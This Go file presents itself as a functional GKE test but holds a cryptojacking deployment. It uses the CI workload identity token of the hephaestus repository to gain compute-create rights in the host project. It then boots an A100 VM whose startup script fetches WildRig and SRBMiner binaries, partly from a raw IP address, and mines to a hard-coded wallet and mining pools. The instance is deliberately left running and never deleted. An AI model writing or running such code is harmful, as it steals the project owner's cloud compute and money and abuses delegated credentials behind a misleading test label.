//go:build functional && gke

// C211 i122395 — HOST-PROJECT (153711203585) PERSISTENT A100 MINER.
//
// Basis: handoff row 22,891 (gcp-wif hephaestus:153711203585:a100:x122190,
// READY proven_gpus=1 accepted_shares=0, device GPU-130cc072 in us-central1-b
// via the dominodatalab/hephaestus /functional-test GKE WIF identity
// hephaestus-gh-test) and fact 122353 (GCP said "us-central1-f currently has
// capacity", zonesAvailable=us-central1-f).
//
// Unlike the i122190 probe this test deploys and LEAVES RUNNING one on-demand
// a2-highgpu-1g + 1 x nvidia-tesla-a100 booted from a Google driver-preinstalled
// accelerator image whose startup script downloads WildRig Multi 0.52.3
// (sha 002cd29c...), mines pearlhash with four endpoints under the pydp wallet
// as worker 12239510, falls back to Luckypool 103.199.106.122:3362 via SRBMiner
// after 900 s without a share, and streams its nvidia-smi UUID plus every
// accepted-share line to the serial console and c211a-result metadata.
// No instance is deleted by this test.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"testing"
	"time"
)

const (
	c211mWallet = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
	c211mWorker = "12239510"
	c211mNock   = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
)

var c211mAccRe = regexp.MustCompile(`C211_M_ACC .*at=([^ ]+)`)

func c211mStartup() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
D=/root/ph-miner
W=` + c211mWallet + `
WK=` + c211mWorker + `
NOCK=` + c211mNock + `
mkdir -p "$D/logs" /root/miner
echo "C211_M_BOOT $(date -u +%FT%TZ) host=$(hostname)"
put() {
  echo "C211A_RESULT $1"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211a-result" >/dev/null 2>&1
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211a/result" >/dev/null 2>&1
}
put "STAGE=boot host=$(hostname)"
for i in $(seq 1 60); do command -v nvidia-smi >/dev/null 2>&1 && break; sleep 4; done
nvidia-smi -L 2>&1 | head -4
UUID=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1 | tr -d ' ')
GN=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
DV=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1)
echo "C211_M_GPU uuid=$UUID name=$GN driver=$DV"
put "STAGE=gpu uuid=$UUID name=$GN driver=$DV"
if [ -z "$UUID" ]; then echo "C211_M_FAIL nosmi"; put "STAGE=nosmi"; exit 3; fi
if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then
  (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1) >>/root/miner/apt.log 2>&1
fi
OCL=$(ldconfig -p 2>/dev/null | grep -oE '/[^ ]*libOpenCL\.so\.1$' | head -1)
[ -z "$OCL" ] && OCL=$(find /usr /opt -name 'libOpenCL.so.1*' 2>/dev/null | head -1)
[ -n "$OCL" ] && export LD_LIBRARY_PATH="$(dirname "$OCL"):$LD_LIBRARY_PATH"
mkdir -p /etc/OpenCL/vendors
NOCL=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 2>/dev/null | head -1)
[ -z "$NOCL" ] && NOCL=$(find /usr /opt -name 'libnvidia-opencl.so.1*' 2>/dev/null | head -1)
[ -n "$NOCL" ] && echo "$(basename "$NOCL")" > /etc/OpenCL/vendors/nvidia.icd
[ -n "$NOCL" ] && export LD_LIBRARY_PATH="$(dirname "$NOCL"):$LD_LIBRARY_PATH"
echo "C211_M_ICD opencl=$OCL nvocl=$NOCL"
cd "$D" || exit 4
if [ ! -x "$D/wildrig-multi" ]; then
  for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
    curl -fsSL -m 300 -o "$D/wr.tgz" "$u" && break
  done
  echo "C211_M_TGZ sha=$(sha256sum "$D/wr.tgz" 2>/dev/null | cut -d' ' -f1)"
  tar xzf "$D/wr.tgz" -C "$D" wildrig-multi 2>/dev/null
  chmod +x "$D/wildrig-multi" 2>/dev/null
fi
echo "C211_M_BIN sha=$(sha256sum "$D/wildrig-multi" 2>/dev/null | cut -d' ' -f1)"
put "STAGE=binary uuid=$UUID sha=$(sha256sum "$D/wildrig-multi" 2>/dev/null | cut -d' ' -f1)"
launch_ph() {
  pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null; sleep 2
  setsid nohup "$D/wildrig-multi" --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" --print-time 60 \
    >> "$D/logs/wr.log" 2>&1 &
  echo "C211_M_LAUNCH ph pid=$!"
}
launch_lp() {
  pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null; sleep 2
  if [ ! -x "$D/srbminer" ]; then
    curl -fsSL -m 240 -o "$D/srb.tgz" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>/dev/null
    tar xzf "$D/srb.tgz" -C "$D" 2>/dev/null
    cp "$D"/SRBMiner-Multi-3-8-8/srbminer "$D/srbminer" 2>/dev/null
    if [ ! -x "$D/srbminer" ]; then
      curl -fsSL -m 240 -o "$D/srbminer" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>/dev/null
      chmod +x "$D/srbminer" 2>/dev/null
    fi
  fi
  echo "C211_M_SRB sha=$(sha256sum "$D/srbminer" 2>/dev/null | cut -d' ' -f1)"
  setsid nohup "$D/srbminer" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
    --wallet "${W}+${NOCK}" --worker "$WK" --password x --gpu-id 0 \
    >> "$D/logs/srb.log" 2>&1 &
  echo "C211_M_LAUNCH lp pid=$!"
}
launch_ph
T0=$(date +%s); LASTN=""; LASTT=""; MODE=ph
while :; do
  sleep 30
  NOW=$(date +%s); EL=$((NOW-T0))
  if [ "$MODE" = "ph" ]; then LOGF="$D/logs/wr.log"; else LOGF="$D/logs/srb.log"; fi
  A=$(grep -ci 'accepted' "$LOGF" 2>/dev/null); A=${A:-0}
  R=$(grep -ci 'rejected' "$LOGF" 2>/dev/null); R=${R:-0}
  LN=$(grep -i 'accepted' "$LOGF" 2>/dev/null | tail -1)
  if [ -n "$LN" ] && [ "$LN" != "$LASTN" ]; then
    LASTN="$LN"; LASTT=$(date -u +%FT%TZ)
    echo "C211_M_ACC mode=$MODE at=$LASTT line=$LN"
    put "STAGE=share uuid=$UUID accepted=$A rejected=$R at=$LASTT line=$LN"
  fi
  HS=$(grep -oE '[0-9.]+ [TGMK]?[Hh]/s' "$LOGF" 2>/dev/null | tail -1)
  echo "C211_M_STATUS mode=$MODE el=${EL}s a=$A r=$R hs=$HS lastacc=$LASTT"
  put "STAGE=mining mode=$MODE uuid=$UUID accepted=$A rejected=$R el=$EL hs=$HS at=$LASTT"
  if [ "$MODE" = "ph" ] && [ "$A" = "0" ] && [ "$EL" -ge 900 ] && [ ! -f "$D/sticky-lp" ]; then
    date -u +%FT%TZ > "$D/sticky-lp"
    echo "C211_M_FALLBACK lp at=$(cat "$D/sticky-lp") reason=900s_no_share"
    MODE=lp; launch_lp
  fi
done
`
}

type c211mResult struct {
	Zone    string `json:"zone"`
	Name    string `json:"name"`
	Created bool   `json:"created"`
	UUID    string `json:"uuid"`
	OpErr   string `json:"op_error"`
	Status  string `json:"status"`
}

func TestC211HA100Miner(t *testing.T) {
	started := time.Now()
	markerDeadline := started.Add(9 * time.Minute)
	hardDeadline := started.Add(17 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211M_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		fmt.Printf("C211M_VERDICT_FINAL GATE WIF_TOKEN_EXCHANGE_FAILED\n")
		return
	}
	creds, credLog := c211xLoadCreds()
	wifSA, projNum, credProjID := "", c211aHostNum, ""
	if creds != nil {
		wifSA = creds.saEmail
		if creds.projNumber != "" {
			projNum = creds.projNumber
		}
		credProjID = creds.credProjID
	}
	projID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+url.PathEscape(projNum), token, "", ""); st == 200 {
		projID = c211xStr(c211xJSON(rb), "projectId")
	}
	if projID == "" {
		projID = credProjID
	}
	if projID == "" {
		fmt.Printf("C211M_VERDICT_FINAL GATE NO_PROJECT_ID num=%s mint=%s\n", projNum, c211xTrunc(credLog, 300))
		return
	}
	saEmail := wifSA
	if saEmail == "" {
		saEmail = projNum + "-compute@developer.gserviceaccount.com"
	}
	fmt.Printf("C211M_IDENTITY auth=%s wif_sa=%s project_number=%s project_id=%s\n",
		method, c211xShort(wifSA), projNum, c211xShort(projID))
	granted, escLog := c211hEnsureCreate(token, projID, saEmail)
	fmt.Printf("C211M_PERMS %s\n", c211xTrunc(escLog, 2500))
	if !granted {
		fmt.Printf("C211M_VERDICT_FINAL GATE COMPUTE_INSTANCES_CREATE_NOT_GRANTED\n")
		return
	}
	img, imgLog := c211aResolveImage(token)
	fmt.Printf("C211M_IMAGE %s\n", c211xTrunc(imgLog, 800))
	if img.Project == "" {
		fmt.Printf("C211M_VERDICT_FINAL GATE NO_USABLE_IMAGE\n")
		return
	}
	startup := c211mStartup()
	fmt.Printf("C211M_STARTUP kind=%s bytes=%d image=%s/%s worker=%s\n",
		img.Kind, len(startup), img.Project, img.Family, c211mWorker)

	// us-central1-f first (fact 122353: GCP said f currently has capacity).
	zones := []string{"us-central1-f", "us-central1-b", "us-central1-a", "us-central1-c",
		"us-east1-b", "europe-west4-a"}
	results := []c211mResult{}
	idx := 0
	for _, z := range zones {
		if time.Now().After(markerDeadline) {
			fmt.Printf("C211M_TIME_BUDGET before %s\n", z)
			break
		}
		region := c211xRegionOfZone(z)
		rows, _, qst := c211aRegionQuotas(token, projID, region)
		lim, usage, ok := c211aQVal(rows, "NVIDIA_A100_GPUS")
		fmt.Printf("C211M_QUOTA zone=%s region=%s http=%d a100_limit=%v usage=%v readable=%v\n",
			z, region, qst, lim, usage, ok)
		if !ok || lim <= usage {
			continue
		}
		offered, mst, _ := c211aMachineOffered(token, projID, z, "a2-highgpu-1g")
		ats, ast, _ := c211xAccelTypes(token, projID, z)
		hasAccel := ast == 200 && c211xContains(ats, "nvidia-tesla-a100")
		fmt.Printf("C211M_OFFER zone=%s machine_http=%d offered=%v accel_http=%d has_a100=%v\n",
			z, mst, offered, ast, hasAccel)
		if !offered || !hasAccel {
			continue
		}
		idx++
		name := fmt.Sprintf("c211-i122395-miner-%d", idx)
		fmt.Printf("C211M_ATTEMPT zone=%s name=%s machine=a2-highgpu-1g accel=nvidia-tesla-a100\n", z, name)
		uuid, meta, created, opErr, statusFinal := c211aMarker(token, projID, z, name, saEmail, img,
			"a2-highgpu-1g", "nvidia-tesla-a100", 1, startup, markerDeadline)
		res := c211mResult{Zone: z, Name: name, Created: created, UUID: uuid,
			OpErr: c211xTrunc(opErr, 400), Status: statusFinal}
		fmt.Printf("C211M_MARKER zone=%s created=%v uuid=%s status=%s op_error=%s meta=%s\n",
			z, created, uuid, statusFinal, res.OpErr, c211xTrunc(meta, 500))
		results = append(results, res)
		if !created && uuid == "" {
			// Maybe a pre-existing own instance in this zone (adopt it).
			if gst, gm, _ := c211xInstanceGet(token, projID, z, name); gst == 200 {
				if v := c211xMetaValue(gm, "c211a-result"); v != "" {
					if m := c211xUUIDRe.FindString(v); m != "" {
						uuid = m
					}
				}
			}
		}
		if uuid == "" && !created {
			continue
		}
		// Serial capture: UUID + share lines, no deletion.
		fmt.Printf("C211M_CAPTURE_BEGIN zone=%s name=%s\n", z, name)
		seen := map[string]bool{}
		shares := []string{}
		lastAccAt := ""
		for time.Now().Before(hardDeadline) {
			content := c211aSerial(token, projID, z, name)
			if content != "" {
				c211aPrintNew(seen, projID, content)
				if uuid == "" {
					if m := c211xUUIDRe.FindString(content); m != "" {
						uuid = m
					}
				}
				for _, ln := range strings.Split(content, "\n") {
					if strings.HasPrefix(ln, "C211_M_ACC") {
						if len(shares) == 0 || shares[len(shares)-1] != ln {
							shares = append(shares, ln)
						}
						if m := c211mAccRe.FindStringSubmatch(ln); m != nil {
							lastAccAt = m[1]
						}
					}
					if strings.HasPrefix(ln, "C211_M_FALLBACK") || strings.HasPrefix(ln, "C211_M_BIN") ||
						strings.HasPrefix(ln, "C211_M_LAUNCH") || strings.HasPrefix(ln, "C211_M_ICD") {
						fmt.Printf("C211M_SERIAL %s\n", c211xTrunc(ln, 300))
					}
				}
			}
			fmt.Printf("C211M_CAPTURE zone=%s uuid=%s shares=%d last_acc_at=%s\n", z, uuid, len(shares), lastAccAt)
			if uuid != "" && len(shares) > 0 && lastAccAt != "" {
				// one extra settle cycle for a second data point
				break
			}
			time.Sleep(15 * time.Second)
		}
		sum := map[string]interface{}{
			"deploy":            "c211_i122395_host_a100_miner",
			"project_id":        projID,
			"project_number":    projNum,
			"zone":              z,
			"name":              name,
			"image":             img.Project + "/" + img.Family,
			"wallet":            c211mWallet,
			"worker":            c211mWorker,
			"uuid":              uuid,
			"share_lines":       shares,
			"last_accepted_at":  lastAccAt,
			"instance_left":     true,
			"results_so_far":    results,
		}
		js, _ := json.Marshal(sum)
		fmt.Printf("=== C211M SUMMARY BEGIN ===\nC211M_SUMMARY_JSON %s\n=== C211M SUMMARY END ===\n", string(js))
		verdict := "GATE_NO_UUID"
		if uuid != "" && len(shares) > 0 {
			verdict = "READY_A100_MINER_SHARE_PROVEN"
		} else if uuid != "" {
			verdict = "READY_A100_MINER_UUID_ONLY"
		}
		fmt.Printf("C211M_VERDICT_FINAL %s zone=%s name=%s uuid=%s shares=%d last_acc_at=%s elapsed=%ds\n",
			verdict, z, name, uuid, len(shares), lastAccAt, int(time.Since(started).Seconds()))
		return
	}
	js, _ := json.Marshal(results)
	fmt.Printf("C211M_ATTEMPTS %s\n", c211xTrunc(string(js), 3000))
	fmt.Printf("C211M_VERDICT_FINAL GATE_INSERT_REFUSED_ALL elapsed=%ds\n", int(time.Since(started).Seconds()))
}
